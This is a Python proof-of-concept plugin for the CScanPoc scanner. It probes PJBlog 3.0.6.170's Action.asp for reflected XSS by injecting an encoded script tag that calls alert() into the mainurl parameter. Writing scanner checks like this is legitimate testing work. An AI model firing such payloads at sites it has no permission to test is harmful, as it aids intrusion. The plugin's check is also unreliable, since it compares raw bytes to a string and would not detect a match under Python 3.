# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'PJBlog_0002'  # 平台漏洞编号，留空
    name = 'PJBlog 3.0.6.170 /Action.asp XSS漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2009-05-08'  # 漏洞公布时间
    desc = '''
        PJBlog是由舜子（陈子舜，英文名字PuterJam，PJblog就是以他英文名字缩写命名的，他本人就职于腾讯公司QZONE开发组）所开发的一套开源免费的中文个人博客系统程序，采用asp+Access的技术，PJBlog同时支持简繁中文，UTF-8编码，相对于其他系统，PJBlog具有相当高的运作效能以及更新率，也支持目前Blog所使用的新技术。
        漏洞文件：Action.asp
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-11236'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PJBlog'  # 漏洞应用名称
    product_version = '3.0.6.170'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '902fe4d3-1fea-475c-a45d-0c4b446c22d6'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/Action.asp?action=type1&mainurl=xxx">%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
